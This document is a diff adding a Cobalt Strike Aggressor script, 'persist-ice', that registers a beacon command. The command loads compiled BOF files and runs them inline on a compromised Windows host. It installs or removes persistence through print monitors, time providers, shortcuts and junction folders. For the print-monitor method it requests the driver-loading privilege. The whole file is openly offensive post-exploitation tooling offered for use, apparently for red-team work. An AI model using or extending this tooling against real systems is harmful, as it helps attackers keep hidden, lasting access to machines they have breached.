@@ -1,0 +1,121 @@
+beacon_command_register(
+"persist-ice", 
+"A set of persistence techniques to appeal the masses", 
+"Synopsis: persist-ice [PrintMon, TimeProv, Shortcut, Junction] [persist or clean] [key/folder name] [dll / lnk exe name]");
+
+
+alias persist-ice {
+    $data = substr($0, 12);
+    @args = split(' ', $data); 
+	local('$_type $_action $_registryKeyName $_dllName $_action_int');
+
+	# map args to variables
+	$_type = @args[0];
+	$_action = @args[1];
+	$_registryKeyName = @args[2];
+	$_dllName = @args[3];
+
+	if($_action iswm "persist")
+	{
+		$_action_int = 0;
+	}
+	else if($_action iswm "clean")
+	{
+		$_action_int = 1;
+	}
+	else
+	{
+		berror($1,"Error: Not a valid argument");
+		return;
+	}
+
+
+
+	#Determine correct type of persistence
+	if($_type iswm "PrintMon")
+	{
+		# Make sure we have the right permissions
+		if(!-isadmin $1)
+		{
+			berror($1,"Error: Must be admin for this persistence mechanism");
+			return;
+		}
+
+		#Need these privilieges to load a new print monitor
+		bgetprivs($1, "SeLoadDriverPrivilege");
+
+		# read in the right BOF file
+	    $handle = openf(script_resource("persist-ice-monitor.o"));
+	    $bof = readb($handle, -1);
+	    closef($handle);
+	    if(strlen($bof) < 1)
+		{
+			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
+			return;
+		}
+	}
+	else if($_type iswm "TimeProv")
+	{
+		# Make sure we have the right permissions
+		if(!-isadmin $1)
+		{
+			berror($1,"Error: Must be admin for this persistence mechanism");
+			return;
+		}
+		# read in the right BOF file
+	    $handle = openf(script_resource("persist-ice-time.o"));
+	    $bof = readb($handle, -1);
+	    closef($handle);
+	    if(strlen($bof) < 1)
+		{
+			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
+			return;
+		}
+	}
+	else if($_type iswm "Shortcut")
+	{
+		if($_action_int == 1)
+		{
+			berror($1,"Error: This function does not support automatic cleanup");
+			return;
+		}
+
+	    $handle = openf(script_resource("persist-ice-shortcut.o"));
+	    $bof = readb($handle, -1);
+	    closef($handle);
+	    if(strlen($bof) < 1)
+		{
+			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
+			return;
+		}
+	}
+		else if($_type iswm "Junction")
+	{
+	    $handle = openf(script_resource("persist-ice-junction.o"));
+	    $bof = readb($handle, -1);
+	    closef($handle);
+	    if(strlen($bof) < 1)
+		{
+			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
+			return;
+		}
+
+	}
+	else
+	{
+			berror($1,"Error: Not a valid type of persistence");
+			return;
+	}
+
+
+     # pack our arguments
+    $bofArgs = bof_pack($1, "iZZ", $_action_int, $_registryKeyName, $_dllName);
+
+    btask($1, "Running Persist-ICE");
+
+    # execute it.
+    beacon_inline_execute($1, $bof, "go", $bofArgs);
+
+
+}
+
